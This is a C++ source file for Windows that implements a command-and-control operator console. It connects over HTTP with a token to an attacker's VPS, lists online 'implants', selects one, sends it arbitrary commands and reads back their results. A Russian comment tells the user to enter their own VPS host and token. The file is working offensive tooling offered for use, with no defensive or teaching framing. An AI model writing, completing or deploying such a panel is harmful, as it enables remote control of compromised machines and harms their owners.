// language: C++, file: panel.cpp, target: Windows x64, MinGW
#define NOMINMAX
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <iostream>
#include <vector>

static std::wstring Widen(const std::string& s) {
    if (s.empty()) return {};
    int n = MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), nullptr, 0);
    std::wstring w(n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), w.data(), n);
    return w;
}

static std::string HttpPost(const std::wstring& host, int port,
                            const std::wstring& token, const std::wstring& path,
                            const std::string& body) {
    HINTERNET s = WinHttpOpen(L"panel/1.0",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return {};
    HINTERNET c = WinHttpConnect(s, host.c_str(), (INTERNET_PORT)port, 0);
    HINTERNET r = WinHttpOpenRequest(c, L"POST", path.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    std::wstring hdr = L"X-Token: " + token +
                       L"\r\nContent-Type: application/json";
    WinHttpSendRequest(r, hdr.c_str(), -1, (LPVOID)body.data(),
                       (DWORD)body.size(), (DWORD)body.size(), 0);
    WinHttpReceiveResponse(r, nullptr);
    std::string resp; DWORD avail, got; char buf[4096];
    do {
        if (!WinHttpQueryDataAvailable(r, &avail) || !avail) break;
        DWORD chunk = (avail < sizeof(buf)) ? avail : (DWORD)sizeof(buf);
        if (!WinHttpReadData(r, buf, chunk, &got)) break;
        resp.append(buf, got);
    } while (got);
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return resp;
}

static std::string HttpGet(const std::wstring& host, int port,
                           const std::wstring& token, const std::wstring& path) {
    HINTERNET s = WinHttpOpen(L"panel/1.0",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return {};
    HINTERNET c = WinHttpConnect(s, host.c_str(), (INTERNET_PORT)port, 0);
    HINTERNET r = WinHttpOpenRequest(c, L"GET", path.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    std::wstring hdr = L"X-Token: " + token;
    WinHttpSendRequest(r, hdr.c_str(), -1, nullptr, 0, 0, 0);
    WinHttpReceiveResponse(r, nullptr);
    std::string resp; DWORD avail, got; char buf[4096];
    do {
        if (!WinHttpQueryDataAvailable(r, &avail) || !avail) break;
        DWORD chunk = (avail < sizeof(buf)) ? avail : (DWORD)sizeof(buf);
        if (!WinHttpReadData(r, buf, chunk, &got)) break;
        resp.append(buf, got);
    } while (got);
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return resp;
}

static std::vector<std::string> ListImplants(const std::string& json) {
    std::vector<std::string> ids;
    size_t p = 0;
    while ((p = json.find('"', p)) != std::string::npos) {
        size_t e = json.find('"', p + 1);
        if (e == std::string::npos) break;
        std::string k = json.substr(p + 1, e - p - 1);
        if (!k.empty() && k.find(':') == std::string::npos) ids.push_back(k);
        p = e + 1;
    }
    return ids;
}

int main() {
    // ПРАВЬ ЗДЕСЬ — впиши свой VPS и токен
    std::wstring HOST  = L"your-vps.example.net";
    int          PORT  = 8080;
    std::wstring TOKEN = L"CHANGE_ME_LONG_RANDOM";

    std::cout << "panel v1 — commands: list, use <id>, send <cmd>, results, exit\n\n";

    std::string active, line;
    while (true) {
        std::cout << (active.empty() ? "> " : "[" + active.substr(0,8) + "] > ");
        std::getline(std::cin, line);
        if (line == "exit" || line == "quit") break;

        if (line == "list") {
            auto ids = ListImplants(HttpGet(HOST, PORT, TOKEN, L"/panel/implants"));
            if (ids.empty()) std::cout << "(no implants online)\n";
            else for (auto& id : ids) std::cout << "  " << id << "\n";
        }
        else if (line.rfind("use ", 0) == 0) {
            active = line.substr(4);
            std::cout << "active: " << active << "\n";
        }
        else if (line.rfind("send ", 0) == 0) {
            if (active.empty()) { std::cout << "no active implant\n"; continue; }
            std::string cmd = line.substr(5);
            HttpPost(HOST, PORT, TOKEN, L"/panel/send",
                     "{\"id\":\"" + active + "\",\"cmd\":\"" + cmd + "\"}");
            std::cout << "sent\n";
        }
        else if (line == "results") {
            if (active.empty()) { std::cout << "no active implant\n"; continue; }
            std::cout << HttpGet(HOST, PORT, TOKEN,
                                 L"/panel/results/" + Widen(active)) << "\n";
        }
        else std::cout << "commands: list, use <id>, send <cmd>, results, exit\n";
    }
    return 0;
}
